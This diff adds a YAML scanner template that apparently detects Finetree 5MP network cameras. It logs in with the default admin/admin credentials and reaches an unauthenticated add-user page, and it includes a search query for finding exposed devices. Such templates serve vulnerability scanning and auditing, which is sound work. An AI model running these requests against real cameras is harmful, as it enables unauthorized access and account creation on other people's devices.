@@ -1,0 +1,22 @@
+name: Finetree 5MP Network Camera Default Login unauthorized user add
+manual: true
+query: title="5MP Network Camera"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: user=admin&pwd=admin&method=login
+    expression: response.status == 302
+  r1:
+    request:
+      method: GET
+      path: /quicksetup/user_pop.php?method=add
+    expression: response.status == 200 && response.body.bcontains(b"Add User")
+expression: r0() || r1()
+detail:
+  description: Finetree 5MP Network Camera is a network camera.
+  tags: defaultaccount
